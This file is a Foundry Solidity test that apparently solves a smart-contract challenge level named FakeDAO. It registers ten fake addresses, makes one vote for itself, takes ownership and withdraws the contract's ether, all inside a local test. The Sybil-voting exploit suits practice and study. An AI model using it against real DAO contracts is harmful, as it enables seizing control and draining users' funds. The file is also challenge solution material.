// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";

// forge test --match-contract FakeDAOTest -vvvv
contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
    }

    function testExploitLevel() public {
        for (uint256 i = 1; i <= 10; i++) {
            address user = address(uint160(i));
            vm.prank(user);
            instance.register();
        }
        address user10 = address(uint160(10));
        vm.prank(user10);
        instance.voteForYourself();
        vm.prank(user10);
        instance.withdraw();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
